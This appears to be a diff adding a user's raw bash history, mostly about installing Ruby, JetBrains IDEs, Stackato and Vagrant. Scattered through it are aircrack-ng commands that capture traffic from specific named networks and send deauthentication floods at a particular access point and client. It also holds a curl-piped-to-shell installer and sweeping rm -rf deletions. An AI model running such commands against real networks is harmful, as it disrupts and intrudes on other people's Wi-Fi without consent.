@@ -1,0 +1,2000 @@
+ls
+cd ho
+cd /
+cd usr/
+cd share/
+cd ..
+ls -la
+cd bin/
+ls
+cd ..
+ls
+cd share/
+ls -la
+cd idea-IC-139.224.1/
+ls
+cd bin/
+ls -la
+./idea
+./idea.sh 
+cd ..
+rm -rf idea-IC-139.224.1/
+sudo rm -rf idea-IC-139.224.1/
+cd /
+cd ~
+ls
+cd Downloads/
+ls
+tar -zxvf RubyMine-7.0.tar.gz 
+ls -la
+ls la
+ls
+sudo mv RubyMine-7.0 /usr/share/
+cd /usr/share/
+ls -la
+ls
+cd RubyMine-7.0/
+ls
+cd bin/
+ls -la
+./rubymine.sh 
+pmi action suspend
+sudo shutdown -h now
+cd /home/nino/RubymineProjects/untitled1/lib
+ruby
+ruby untitled1.rb 
+irb
+ruby
+ruby version
+ruby -v
+cd ..
+ls
+cd ..
+ls
+cd/
+cd /
+ls
+cd ~
+ls
+cd RubymineProjects/
+ls
+cd RubyTesting/
+ls
+cd lib/
+ls
+ruby RubyTesting
+ruby RubyTesting.rb 
+gedit
+curl http://feedback.ebay.com/ws/eBayISAPI.dll?ViewFeedback2&userid=vincent31162012&&_trksid=p2047675.l2560&rt=nc&iid=251679071634&sspagename=VIP:feedback&ftab=FeedbackAsSeller
+curl http://feedback.ebay.com/ws/eBayISAPI.dll?ViewFeedback2&userid=vincent31162012&&_trksid=p2047675.l2560&rt=nc&iid=251679071634&sspagename=VIP:feedback&ftab=FeedbackAsSeller > feedback.txt
+ls -la
+cat feedback.txt 
+cat feedback.txt
+rm feedback.txt 
+curl http://feedback.ebay.com/ws/eBayISAPI.dll?ViewFeedback2&userid=vincent31162012&&_trksid=p2047675.l2560&rt=nc&iid=251679071634&sspagename=VIP:feedback&ftab=FeedbackAsSeller | feedback.tx
+ls
+curl http://feedback.ebay.com/ws/eBayISAPI.dll?ViewFeedback2&userid=vincent31162012&&_trksid=p2047675.l2560&rt=nc&iid=251679071634&sspagename=VIP:feedback&ftab=FeedbackAsSeller | grep shipping
+grep shipping | curl http://feedback.ebay.com/ws/eBayISAPI.dll?ViewFeedback2&userid=vincent31162012&&_trksid=p2047675.l2560&rt=nc&iid=251679071634&sspagename=VIP:feedback&ftab=FeedbackAsSeller
+get install bson_ext
+gem install bson_ext
+gem update --system
+sudo gem update --system
+gem install bson
+ruby -v
+gem install bson_ext
+ping google.ca
+get update --system
+gem update --system
+get install bson
+gem install bson
+sudo gem install bson
+sudo shutdown -h now
+stackato
+ls -la
+stackato
+sudo shutdown -h now
+avahi
+avahi deamon
+avahi
+ping 192.75.245.159
+ls -la
+cd /
+ls
+cd usr/
+ls
+cd share/
+ls
+cd ..
+ls
+cd /
+ls
+cd ~
+ls
+cd StackatoProjects/
+ls
+cd pet-clinic/
+stackato push -n -d 
+stackato delete -n
+mvn package 
+ls -la
+stackato push -n -d
+ls
+stackato 
+cat stackato.yml 
+cd /
+avahi-deamon
+sudo avahi-daemon 
+cd ~
+ls
+cd StackatoProjects/
+ls
+cd pet-clinic/
+stackato push -n -d
+stackato start pet-clinic
+ls
+cd Desktop/
+ls
+sudo mv ~/sfu
+cd ~
+ls
+ls -la
+locate sfu
+cd /home/nino/Desktop
+ls
+ls -la
+cd /~
+ls
+ls -la
+locate sfuSecureConnect
+cd /home/nino/Desktop/
+ls
+ls -la
+sudo mv sfuSecureConnect /home/nino/
+cd /
+ls
+cd ~
+ls
+cd /
+sudo mv ~ sfuSecureConnect
+ls
+cd ~
+ls
+ls -la
+cd ~
+cd /home
+ls
+ls -la
+ls
+cd sfuSecureConnect
+ls
+locate sfuSecureConnect
+ls
+cd /
+ls
+cd ~
+cd sfuSecureConnect/
+ls
+sudo mv . /home/nino
+cd ..
+ls
+sudo mv sfuSecureConnect/ /home/nino
+ls
+cd ~
+ls
+cd 
+ls
+cd ?
+/
+ls
+cd /
+ls
+cd /~
+ls
+pwd
+cd .
+ls
+cd ..
+ls
+mv /~ /a
+sudo  mv /~ /a
+ls
+rm /a
+sudo -rf /a
+sudo rm -rf /a
+ls
+cd ~
+ls
+cd sfuSecureConnect/
+ls
+stackato 
+clear
+sudo apt-get update
+sudo apt-get install aircrack-ng
+iwconfig
+/sbin/iwconfig
+sudo airmon-ng start wlan0
+airdump-ng wlan0
+airodump-ng wlan0
+sudo airodump-ng 
+sudo airodump-ng wlan0
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0
+iwconfig wlan0
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+sudo airmon-ng start wlan0
+iwconfig mon2
+iwconfig mon1
+iwconfig wlan0
+sudo airodump-ng wlan0
+sudo airodump-ng -c 6 -w data-capture wlan0
+sudo avahi-daemon 
+sudo kill 5512
+stackatofexit
+avahi-daemon
+sudo avahi-daemon
+sudo avahi-daemon stop
+sudo avahi-daemon help
+id avahi
+sudo service avahi-daemon stop
+avahi-daemon stop
+kill 5512
+sudo kill 5512
+sudo avahi-daemon 
+kill help
+kill man
+man kill
+sudo kill -9 5512
+ps
+sudo avahi-daemon 
+top
+sudo avahi-daemon 
+avahi-damon
+sudo avahi-daemon 
+wget
+wget https://stackato-k9hr.local
+sudo kill -9 11710
+sudo avahi-daemon
+top
+ps
+ls -la
+cd .skype
+.skype
+./.skype
+sudo avahi-daemon
+sudo pkill -9 11710
+sudo avahi-daemon
+sudo kill -9 11710
+sudo avahi-daemon help
+sudo avahi-daemon 
+sudo shutdown -h now
+cd /usr/local/bin/
+ls -la
+sudo shutdown -h now
+sudo avahi-daemon
+sudo avahi-daemon --reload
+sudo avahi-daemon --kill
+sudo avahi-daemon 
+sudo avahi-daemon --check
+stackato 
+stackato services
+stackato tunnel bottle-currency-db
+stackato delete pet-catalog
+stackato tunnel bottle-currency-db
+sudo apt-get update
+ls
+cd /home/
+ls
+cd ~
+ls
+cd Downloads/
+wget http://download.redis.io/redis-stable.tar.gz
+tar -xzvf redis-stable.tar.gz 
+cd redis-stable/
+cd ..
+sudo move redis-stable /usr/share/
+sudo mv redis-stable /usr/share/
+cd /usr/share/
+cd redis-stable/
+make
+make test
+make install
+install
+install redis-server
+make install redis-server
+make install
+make
+ls -la
+./INSTALL
+SUDO ./INSTALL
+sud ./INSTALL
+sudo ./INSTALL
+./instal
+sudo cp src/redis-server /usr/local/bin
+sudo cp src/redis-cli /usr/local/bin
+cd /
+ls
+cd ~
+stackato
+stackato services
+stackato tunnel harbor
+ls
+ls
+cd StackatoProjects/
+ls
+cd bottle-currency/
+git status -s
+stackato push -n -d
+connecty
+connect
+start
+start bottle-currency
+connecty
+connect
+luanch
+connect
+cd /
+sudo ssh stackato@207.23.213.158
+curl ohmyz
+locate
+locate homyz
+curl -L http://install.homyz.sh | sh
+curl -L http://install.ohmyz.sh | sh
+ohmyz
+locate ohmyz
+ls
+zsh
+source ~/.bashrc
+stackato
+stackato 
+cd /usr/local/
+ls
+cd heroku/
+ls
+ls bin
+sudo cp heroku /usr/local/bin/
+ls -la
+cd bin/
+sudo cp heroku /usr/local/bin/
+cd /
+heoku
+heroku
+iwconfig
+sudo airmon-ng start wlan0
+sudo airodump-ng mono0
+sudo airodump-ng mon0
+ls
+cd /
+ls
+\cd ~
+sudo gedit wep-steps
+iwconfig
+iwconfig wlan0 down
+sudo wlan0 down
+cd /usr/bin/
+ls
+cd ..
+ls
+cd local/
+ls
+cd bin/
+ls
+cd /
+redis-server 
+ls
+cd usr/local/
+ls -la
+cd bin/
+ls -la
+cd /usr/share/
+ls -la
+cd stackato-3.1.2-linux-glibc2.3-x86_64/
+ls
+cd ..
+ls
+cd android-studio/
+ls -la
+cd bin/
+ls
+cd ..
+ls
+cd ..
+ls
+cd stackato-3.1.2-linux-glibc2.3-x86_64/
+sudo cat ~/.bashrc
+sudo nano ~/.bashrc
+sudo cp stackato /usr/local/bin/
+ls -la
+cd /usr/local/bin/
+ls -la
+sudo nano ~/.bashrc
+cd  /
+heruk
+heroku
+cd /
+cd dev/
+ls
+cd sdx
+ls
+cd ..
+ls
+ddrescue
+sudo ddrescue -d -D --force ubuntu-mate-14.10-desktop-i386.iso /dev/sdx
+sudo apt-get update
+sudo apt-get install gddrescue
+sudo ddrescue -d -D --force ubuntu-mate-14.10-desktop-i386.iso /dev/sdx
+lsmod
+lsmod | less
+sudo modprobe video 
+lsmod
+sudo apt-get install cheese build-essential linux-headers-`uname -r`
+sudo restrat -h now
+sudo shutdown -h now
+sudo apt-remove skype
+sudo apt-get remove skype
+sudo apt-get install cheese build-essential linux-headers-`uname -r`
+locate skype
+cd /usr/share/
+cd skype/
+ls
+cd /
+sudo dpkg --add-architecture i386
+sudo apt-get update && sudo apt-get install skype
+cd usr/
+cd share/
+ls
+cd skype/
+ls
+cd /usr/local/
+lls
+ls
+cd bin/
+ls
+./skype
+skype
+ls -la
+.Skype/
+cd .Skype
+ls
+cd ..
+ls
+sudo apt-get remove skype-bin 
+sudo apt-get remove skype
+sudo apt-get remove skype-*
+sudo apt-get remove skype:i386
+sudo apt-get remove skype
+sudo apt-get remove skype:i386
+locate skype
+locate skype | less
+cd /usr/
+ls 
+cd share/
+ls
+cd skype/
+ls
+cd ..
+ls
+cd ..
+ls
+cd local/
+ls
+cd bin/
+ls
+skype
+./skype
+sudo skype
+sudo apt-get remove skype
+sudo apt-get remove skype-*
+sudo apt-get remove skype:i386
+locate skype
+sudo apt-get remove skype skype-bin:i386 skype:i386
+sudo apt-get install sni-qt:i386
+rm -rf ~/.Skype
+sudo dpkg --add-architecture i386
+sudo apt-get update
+sudo apt-get install gdebi 
+wget download.skype.com/linux/skype-ubuntu-precise_4.3.0.37-1_i386.deb
+sudo gdebi skype-ubuntu-precise_4.3.0.37-1_i386.deb
+ls -la
+rm skype-ubuntu-precise_4.3.0.37-1_i386.deb 
+ls -la
+sudo apt-get remove skype skype-bin:i386 skype:i386
+sudo apt-get install sni-qt:i386
+rm -rf ~/.Skype
+sudo apt-get remove skype
+clear
+iwconfig
+sudo airmon-ng start wlan0
+sudo airodump-ng mon0
+sudo airplay-ng --deauth 100 -a 4C:8B:30:25:A2:DD mon0
+sudo aireplay-ng --deauth 100 -a 4C:8B:30:25:A2:DD mon0
+sudo aireplay-ng --deauth 100 -a 4C:8B:30:25:A2:DD mon0 --ignore-negative-one
+sudo aireplay-ng -0 100 -a 4C:8B:30:25:A2:DD mon0
+sudo aireplay-ng -0 100 -a 4C:8B:30:25:A2:DD mon0 --ignore-negative-one
+sudo aireplay-ng -0 100 -a 4C:8B:30:25:A2:DD -c  78:4B:87:66:E6:35 mon0
+sudo aireplay-ng -0 100 -a 4C:8B:30:25:A2:DD -c  78:4B:87:66:E6:35 -e  TELUS1590 mon0
+sudo apt-get install build-essential
+cd Downloads/
+ls
+sudo mv darkc0de.com/ ~/
+cd darkc0de.com/
+ls
+cd ..
+rm -rf darkc0de.com/
+tar -xzvf darkc0de.tar.gz 
+ls -la
+ls
+sudo mv darkc0de.com /home/nino/
+sudo mv darkc0de.com/ /home/nino/
+sudo cp darkc0de.com/ /home/nino/
+ls
+ls
+cd /
+ls
+cd ~
+ls
+cat wep-steps 
+locate WepCrack
+gedit
+sudo apt-get install build-essential
+ls
+cd /
+ls
+cd usr/local/
+ls
+cd bin/
+ls
+cat stackato 
+ls
+cd VirtualBox\ VMs/
+ls
+cd /
+ls
+cd var/
+cd /
+ls
+cd ~
+ls
+cd vagrant/
+ls
+cd ..
+ls
+locate precise
+ls
+cd vagrant/
+ls
+vagrant up
+vagrant init hashicorp/precise32
+ls
+vagrant init
+vagrant up
+cd ..
+ls
+rm -rf vagrant/
+ls
+ls -la
+cd ~/src/
+ls
+cd vagrant/
+ls
+vagrant down
+vagrant destroy
+pwd
+vagrant destroy
+cd /
+locate intellij
+cd ~
+ls -la
+cd Downloads/
+ls
+tar -xvf ideaIC-14.0.1.tar.gz 
+ls
+cd idea-IC-139.225.3/
+ls
+cd ..
+ls
+sudo mv idea-IC-139.225.3 /usr/share/
+cd /usr/share/
+ls
+cd idea-IC-139.225.3/
+ls
+cd bin
+ls
+sudo cp idea.sh /usr/local/bin/
+cd /
+./idea
+idea
+./idea
+.idea
+./idea.sh
+cd usr/local/share/
+ls
+cd /usr/share/
+ls
+cd idea-IC-139.225.3/
+ls
+cd bin/
+./idea.sh 
+ls
+cd ..
+ls
+cd plugins/
+ls
+ls -la | grep "ruby"
+cd ..
+ls
+cd applications
+ls
+cat android-studio.desktop 
+vim android-studio.desktop 
+sudo vim android-studio.desktop 
+cat arduino.desktop 
+cat android-studio.desktop 
+sudo cp android-studio.desktop  intellij.desktop
+vim intellij.desktop 
+sudo vim intellij.desktop 
+cd /
+ls
+cd opt/
+ls
+echo $PATH
+cd /usr/local/share/
+ls
+cd ..
+ls
+cd bin/
+ls
+cd /
+ls
+cd opt/
+ls
+cd ..
+ls
+cd obj/
+ls
+cd ..
+sudo mv obj/ /opt/RubyMine-7.0
+ls
+cd opt/
+ls
+cd RubyMine-7.0/
+ls
+cd bin/
+ls
+./rubymine.sh 
+cd /usr/share/
+ls
+cd applications
+ls
+cat android-studio.desktop 
+sudo airodump-ng -bssid 00:1D:5A:5F:C5:B1 -c 6 -w WepCrack mon0
+sudo airodump-ng --bssid 00:1D:5A:5Fm
+
+cat WepCrack-01.cap
+ls -la
+cat WepCrack-01.csv
+mkdir crack
+cd crack/
+sudo airodump-ng -bssid 4C:8B:30:25:A2:DD -c 1 -w TELUS1590 mon0
+w TELUS1590 mon0
+ls
+cd ..
+ls
+cd bashScripts
+mkdir bashScripts
+cd bashScripts/
+ls
+vi bashTest.sh
+ls
+vi bashTest.sh
+ls
+grep --help > sample.txt
+ls
+cat sample.txt 
+vi sample.txt 
+vim
+vim bashTest.sh 
+vim
+sudo apt-get install vim
+ls -la
+vim bashTest.sh 
+chmod 755 bashTest.sh 
+ls
+./bashTest.sh 
+vim bashTest.sh 
+ls
+rm sample.txt 
+ls
+./bashTest.sh 
+ls -la
+rm sample.txt 
+./bashTest.sh 
+ls
+cat sample.txt 
+ls
+vim bashTest.sh 
+./bashTest.sh 
+vim bashTest.sh 
+ls
+./bashTest.sh 
+vim bashTest.sh 
+./bashTest.sh 
+vim bashTest.sh 
+./bashTest.sh 
+vim bashTest.sh 
+./bashTest.sh 
+vim bashTest.sh 
+./bashTest.sh 
+vim bashTest.sh 
+./bashTest.sh 
+ls
+vim bashTest.sh 
+./bashTest.sh 
+vim bashTest.sh 
+./bashTest.sh 
+ls
+cd backup_2014-11-26/
+ls
+cd ..
+ls
+vim bashTest.sh 
+./bashTest.sh 
+ls
+cd backup_2014-11-26/
+ls
+tar -xf backup.tar 
+ls
+cat sample.txt 
+ls
+cd ..
+ls
+cd /
+ls
+cd usr/
+ls
+cd bin/
+ls
+cd ..
+ls
+cd /
+ls
+cd bin
+ls
+cd ..
+ls
+cd /
+ls
+cd usr/
+ls
+cd bin/
+ls
+cd ..
+ls
+cd /
+ls
+history
+history | grep /bin
+ls
+cd usr/local/bi
+cd usr/local/bin
+ls
+vagrant
+echo $PATH
+cd /
+ls
+cd bin/
+ls
+ls -la | grep "vagrant"
+find vagrant
+cd /
+locate vagrant
+cat ~/.bashrc
+cat ~/.bashrc | less
+ls
+cd ~
+ls
+locate vagrant
+mkdir vagrant
+cd vagrant/
+vagrant init
+vagrant box add hashicorp/precise32
+vagrant up
+cd /
+ls
+locate hashicorp/precise32
+locate "hashicorp/precise32"
+locate "precise32"
+locate "hashicorp"
+cd home/
+ls
+cd nino/
+ls
+cd bashScripts/
+ls
+cd ..
+ls
+cd /
+ls
+cd /
+ls
+us
+locate vagrant
+cd ~
+ls -la
+cd .vagrant.d/
+ls
+cd boxes/
+vagrant up
+ls -la
+cd ~
+ls
+mkdir src
+cd src/
+ls
+mkdir vagrant
+cd vagrant/
+vagrant init
+ls
+vim Vagrantfile 
+cd ~/.vagrant.d/boxes/
+cp -R hashicorp-VAGRANTSLASH-precise32 base
+cd ~/src/vagrant/
+ls
+vagrant up
+ssh vagrant@127.0.0.1
+ssh vagrant@127.0.0.1:2222
+ssh
+sudo ssh vagrant@127.0.0.1:2222
+vagrant ssh
+logout
+ls
+cd ~
+ls
+ls -la
+cd .vagrant.d/
+ls
+cd boxes/
+ls
+cd base/
+ls
+cd ..
+cd hashicorp-VAGRANTSLASH-precise32/
+ls
+cd ~
+ls
+cd bashScripts/
+ls
+vim vagrant_init.sh
+ls
+sudo chmod 755 vagrant_init.sh 
+ls
+./vagrant_init.sh 
+vim vagrant_init.sh 
+./vagrant_init.sh 
+vim vagrant_init.sh 
+./vagrant_init.sh 
+iwconfig
+cd /
+cd ~
+ls
+ls -la 
+cd /
+ls
+cd usr/
+ls
+cd local/
+ls
+cd bin/
+ls
+vim skype
+rm skype
+sudo rm skype
+sudo rm skype~ 
+ls
+top
+ps xorg
+ps Xorg
+top chrome
+ps chrome
+top "chrome"
+service
+ls
+cd /
+ls
+cd usr/
+ls
+cd share/
+ls
+cd /
+ls
+cd usr/
+ls
+cd share/
+ls
+ls -la | less
+locate jetbrains
+ls
+cd application
+cd applications
+ls
+cd ..
+ls
+ls -la | grep "android"
+cd android-studio/
+ls
+cd /
+ls
+cd usr/
+cd share/
+ls
+cd application
+cd applications
+ls
+ls -la | grep "and"
+cd ..
+ls
+cd ..
+ls
+cd local/
+ls
+cd bin/
+ls
+idea
+idea.sh
+rm idea.sh 
+sudo rm idea.sh 
+cd /
+gnome-desktop-item-edit
+sudo apt-get install --no-install-recommends gnome-panel
+gnome-desktop-item-edit ~/Desktop/ --create-new
+ls
+cd /
+ls
+cd opt/
+ls
+cd android-studio/
+ls
+cd ..
+cd vagrant/
+ls
+cd bin/
+ls
+cd ..
+cd /usr/share/
+ls
+ls -la
+la -la | less
+sudo mv arduino/ /opt
+sudo mv /opt/arduino/ /usr/share/
+ls
+sudo mv idea-IC-139.225.3/ /opt
+ls -la | less
+sudo rm -rf android-studio/
+ls
+ls -la | grep "ruby"
+locate ruby
+locate rubymine
+sudo mv RubyMine-7.0/ /obj
+sudo mv RubyMine-7.0/ /opt
+cd /
+ls
+cd ~
+ls
+cd /usr/share/
+ls
+ls -la | less
+cd /opt/
+ls
+cd android-studio/
+ls
+cd bin/
+ls
+cd ..
+ls
+cd ..
+ls
+cd idea-IC-139.225.3/
+ls
+cd bi
+cd bin/
+ls
+pwd
+cd /usr/share/applications
+ls -la 
+ls -la | less
+cat intellij.desktop 
+sudo cat intellij.desktop 
+cat virtualbox.desktop 
+sudo vim intellij.desktop 
+cd /opt/idea-IC-139.225.3/bin/idea.sh
+cd /opt/idea-IC-139.225.3/bin/
+ls
+cd ..
+ls
+cd ..
+ls
+cd /usr/share/
+ls
+cd icons/
+ls
+ellij.desktop 
+cd /usr/share/applications
+sudo vim intellij.desktop 
+ls
+cd /usr/share/applications
+ls
+ls -la | grep "*.ico"
+ls -la | less
+cat defaults.list 
+ls
+cd Downloads/
+ls
+mv 11371-Linux-Cheat-Sheet-\(www.WallpaperMotion.com\).jpg cheatsheat.jpg
+ls
+cd ~
+ls
+cd Pictures/
+ls
+pwd
+cd /
+ls
+cd ~
+ls
+cd Downloads/
+ls
+mv cheatsheat.jpg /home/nino/Pictures/
+cd /home/nino/Pictures/
+ls
+locate rubymine
+cd /usr/share/
+ls
+ls -la | more
+cd ~/Downloads/
+LS
+ls
+rm ruby-7.0.0.20141113.zip 
+ls
+sudo mv ruby /opt/idea-IC-139.225.3/plugins/
+cd /opt/idea-IC-139.225.3/plugins/
+ls
+ks
+ls
+rm -rf ruby/
+ls
+gem install minitest
+sudo gem install minitest
+sudo gem install minitest-reporters
+ruby --version
+echo $RAILS_ENV
+cd ~
+ls
+cd /opt/
+ls
+cd idea-IC-139.225.3/
+ls
+cd plugins/
+ls -la
+ls -la | less
+ls -la | grep "ruby"
+cd Groovy/
+ls
+cd lib
+ls
+cd /
+cd ~/Downloads/
+ls
+rm -rf .
+rm -rf ruby-7.0.0.20141113.zip 
+ls
+find rubymine
+locat rubymine
+locate rubymine
+cd ~/opt
+ls
+cd ~
+ls
+ls -la
+cd opt
+cd /
+ls
+cd opt/
+ls
+cd RubyMine-7.0/
+ls
+cd bin/
+ls
+./rubymine.sh 
+sudo apt-get -y update
+cd /
+cd ~
+sudo apt-get -y install build-essential zlib1g-dev libssl-dev libreadline6-dev libyaml-dev
+cd /tmp
+ls
+wget http://ftp.ruby-lang.org/pub/ruby/2.1/ruby-2.1.5.tar.gz
+ls
+tar -xvzf ruby-2.1.5.tar.gz
+ls
+rm -rf ruby-2.1.5.tar.gz 
+ls
+cd /usr/
+cd share/
+ls
+ls -la | grep "ruby"
+ls
+locate rubu
+locate ruby
+ls -la | less
+locate ruby | less
+cd /usr/bin/
+ls
+ls -la | grep ruby
+cd /tmp/
+ls
+cd ruby-2.1.5/
+./configure --prefix=/usr/local
+sudo make
+sudo make install
+cd /usr/bin/
+ls
+ls -la | grep ruby
+ls
+cd /opt
+ls
+c RubyMine-7.0/
+cd RubyMine-7.0/
+ls
+cd bin/
+./start
+ls
+./rubymine.sh 
+cd /
+ls
+cd usr/
+ls
+cd ~
+ls
+cd RubymineProjects/
+ls
+rm -rf UnitTesting/
+ls
+cd /opt/
+ls
+cd RubyMine-7.0/
+ls
+cd bin/
+./rubymine.sh 
+cd ~
+ks
+ls
+sudo apt-get update
+sudo apt-get install git-core curl zlib1g-dev build-essential libssl-dev libreadline-dev libyaml-dev libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev libcurl4-openssl-dev python-software-properties
+cd 
+git clone git://github.com/sstephenson/rbenv.git .rbenv
+echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
+echo 'eval "$(rbenv init -)"' >> ~/.bashrc
+echo $SHELL
+git clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build
+echo 'export PATH="$HOME/.rbenv/plugins/ruby-build/bin:$PATH"' >> ~/.bashrc
+exec $SHELL
+echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
+echo 'eval "$(rbenv init -)"' >> ~/.bashrc
+exec $SHELL
+echo 'export PATH="$HOME/.rbenv/plugins/ruby-build/bin:$PATH"' >> ~/.bashrc
+exec $SHELL
+rbenv install 2.1.4
+rbenv global 2.1.4
+ruby -v
+ls
+ls -la
+cd .RubyMine70/
+ls
+cd config/
+ls
+cd /
+ls
+irb
+locate ruby
+locate ruby-2.8
+locate ruby-2.*
+locate ruby | less
+cd usr/
+ls
+cd bin/
+ls
+ls -la | grep ruby
+locate ruby1.9.1
+locate ruby1.9.1 | less
+locate ruby2.1.4 | less
+locate 2.1.4
+cd /
+locate 2.1.4
+cd ~
+ls
+ls -la | grep ruby
+ls -la 
+ls -la  | less
+ls
+cd ~
+ls
+ls -la
+ls -la | grep gem
+cd .gem/
+ls
+cd ruby/
+ls
+cd /
+ls
+gem uninstall test-unit
+cd /usr/
+cd local/
+cd lib/
+ls
+cd ruby/
+ls
+cd gems/
+ls
+cd 2.1.0/
+ls
+cd ..
+ls
+cd ..
+ls
+ruby test_unit.rb
+cd~
+cd ~
+gem 'test-unit'
+gem install debase
+gedit
+cd /usr/bin/
+ls
+ls -la | grepmruby
+ls -la | grep ruby
+sudo apt-get install ruby2.1.5
+sudo apt-get install ruby-2.1.5
+sudo apt-get install ruby2.1
+sudo apt-get install Ruby2.1
+sudo apt-get install ruby2.1
+cd /tmp/
+ls
+locate ruby2.1
+locate ruby | more
+cd /usr/
+ls
+cd local/
+ls
+cd bin/
+ls
+cd /
+ls
+cd usr/local/bin/
+ls
+cd /
+ls
+cd /
+cd ~
+ls
+cd /usr/
+ls
+cd bin/
+ls
+cd ..
+ls
+cd src/
+ls
+cd ..
+ls
+grep rubymine
+locate rubymine
+cd /opt/
+ls
+cd RubyMine-7.0/
+ls
+cd bin/
+./rubymine.sh 
+ls
+cd ~
+ls
+cd RubymineProjects/
+ls
+rm -rf RubyTesting/
+rm -rf untitled/
+ls
+irb
+sudo get install test-unit
+sudo gem install test-unit
+sudo gem install test-unit-full
+source
+cd /
+ls
+cd bin/
+ls
+grep ruby
+cd /
+locate ruby
+locate ruby | less
+cd /usr/bin/
+ls
+ls -la | grep "ruby"
+cd ~
+cd /opt/
+ls
+cd RubyMine-7.0/
+ls
+cd bin/
+ls
+./rubymine.sh 
+ls
+cd .rbenv/
+ls
+cd versions/
+ls
+cd /
+ls
+cd .rben
+ls -la 
+cd usr/local/bin/ru
+cd usr/local/bin
+ls
+cd rub
+cd ruby
+cat ruby
+locate ruby
+sudo gem update --system
+gem install debase -v 0.1.0
+gem -v
+gem list | grep debug
+sudo aptitude purge ruby
+sudo apt-get uninstall ruby
+sudo apt-get ruby1.9
+which ruby
+readlink -f /usr/bin/ruby
+dpkg -S /usr/bin/rub
+dpkg -S /usr/bin/ruby
+apt-get purge ruby
+sudo apt-get purge ruby
+irb
+which ruby
+readlink -f /home/nino/.rbenv/shims/ruby 
+dbpk -S /home/nino/.rbenv/shims/ruby
+sudo rbenv uninstall 2.1.4
+rbenv
+sudo rbenv uninstall 2.1.4 
+rbenv uninstall 2.1.4 
+irb
+which ruby
+readlink -f /usr/local/bin/ruby 
+dbkg -S /usr/local/bin/ruby
+apt-get purge ruby
+sudo apt-get purge ruby
+irb
+which ruby
+cd /var/
+ls
+cd lib/
+ls
+cd gems/
+ls
+cd ..
+cd gems/
+cd 1.9.1/
+ls
+cd ..
+sudo rm -rf 1.9.1/
+ls
+cd /opt/
+ls
+rm -rf RubyMine-7.0/
+sudo rm -rf RubyMine-7.0/
+locate RubyMine
+cd /home/nino/
+ls
+ls -la
+rm -rf .RubyMine70/
+ls
+locat Rubymine
+locate rubymine
+locate RubyMine
+cd opt
+cd /opt/
+ls -la
+cd /home/nino/
+ls -la
+ls -la | grep rubymine
+locate ruby
+cd /usr/local/lib/
+ls
+cd ruby/
+ls
+ruby
+cd ..
+sudo rm -rf ruby/
+ls -la
+cd /usr/share/doc
+ls
+sudo rm -rf ruby1.9.1-examples/
+cd /usr/bin/
+ls -la 
+ls -la  | grep ruby
+cd /usr/bin/ruby1.9.1
+cd ..
+cd lib
+ls
+cd /usr/
+ls
+cd include/
+ls
+ls -la | grep ruby
+cd ruby
+ls
+ls -la | less
+cd /usr/local/include/
+ls
+sudo rm -rf ruby-2.1.0/
+ls
+which ruby
+ruby -version
+ruby --version
+ls -la 
+ruby --version
+locate ruby
+ruby --version
+locate ruby 2.1.5
+locate ruby
+aptitude purge ruby
+sudo apt-get install aptitude
+sudo aptitude purge ruby
+ls -la
+locate ruby
+sudo apt-get purge ruby
+cd /usr/local/lib/
+cd ruby
+cd ..
+cd lib
+cd ruby
+cd ..
+cd local/
+cd bin/
+cd ruby
+cd ..
+cd bin/
+cd ruby
+cd ..
+cd local/
+cd bin/
+cd irb
+ls -la | grep irb
+ls -la | grep ruby
+rm -rf /usr/local/lib/ruby
+rm -rf /usr/lib/ruby
+rm -f /usr/local/bin/ruby
+sudo rm -f /usr/local/bin/ruby
+rm -f /usr/bin/ruby
+rm -f /usr/local/bin/irb
+sudo rm -f /usr/local/bin/irb
+rm -f /usr/bin/irb
+rm -f /usr/local/bin/gem
+sudo rm -f /usr/local/bin/gem
+rm -f /usr/bin/gem
+cd /
+locate ruby
+ruby
+ruby --version
+irb
+locate ruby
+cd /var/lib/dbkg
+cd /var/lib/dpkg/
+ls
+dpkg -r ruby
+sudo dpkg -r ruby
+sudo dpkg -r ruby1.9.1
+dpkg -l
+dpkg -l | grep 'ruby'
+dpkg -l | less
+locate ruby
+cd info/
+ls
+ls -la | grep 'ruby'
+locate ruby
+cd ruby1.9.1
+cd ruby1.9.1-dev.list 
+vim ruby1.9.1-dev.list
+sudo cat ruby1.9.1-dev.list
+ruby
+irb
+ruby
+python --version
+ruby --version
+locate python
+cd /usr/
+locate python | less
+cd bin/
+ls
+ls -la | grep 'python'
+ls -la | grep 'ruby'
+sudo apt-get update
+sudo apt-get install git-core curl zlib1g-dev build-essential libssl-dev libreadline-dev libyaml-dev libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev libcurl4-openssl-dev python-software-properties
+cd /usr/
+cd
+cd /usr/local/share/
+cd
+cd 
+cd
+git clone git://github.com/sstephenson/rbenv.git .rbenv
+cd .rbenv/
+ls
+cd ..
+ls
+rm -rf .rbenv/
+sudo apt-get install git-core curl zlib1g-dev build-essential libssl-dev libreadline-dev libyaml-dev libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev libcurl4-openssl-dev python-software-properties
+cd 
+git clone git://github.com/sstephenson/rbenv.git .rbenv
+echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
+echo 'eval "$(rbenv init -)"' >> ~/.bashrc
+exec $SHELL
+git clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build
+echo 'export PATH="$HOME/.rbenv/plugins/ruby-build/bin:$PATH"' >> ~/.bashrc
+exec $SHELL
+rbenv install 2.1.3
+rbenv global 2.1.3
+ruby -v
+cd ~
+ls
+cd RubymineProjects/
+ls
+cd ..
+ls
+sudo rm -rf RubymineProjects/
+gem install test-unit-full
+cd Downloads/
+ls
+sudo rm -rf RubyMine-7.0.tar.gz 
+sudo rm -rf ruby-2.1.5-x64-mingw32.7z 
+ls
+tar -xf RubyMine-7.0\ \(1\).tar.gz 
+ls
+sudo cp RubyMine-7.0 /opt/
+ls
+cd /opt/
+ls
+cd /
+cd ~
+ls
+cd Downloads/
+ls
+cd RubyMine-7.0/
+ls
+cd ..
+sudo mv RubyMine-7.0 /opt/
+ls
+cd /opt/
+ls
+cd RubyMine-7.0/
+ls
+cd bin/
+./rubymine.sh 
+ls
+cd Documents/
+ls
+cd /opt/
+ls
+cd RubyMine-7.0/
+ls
+cd ~
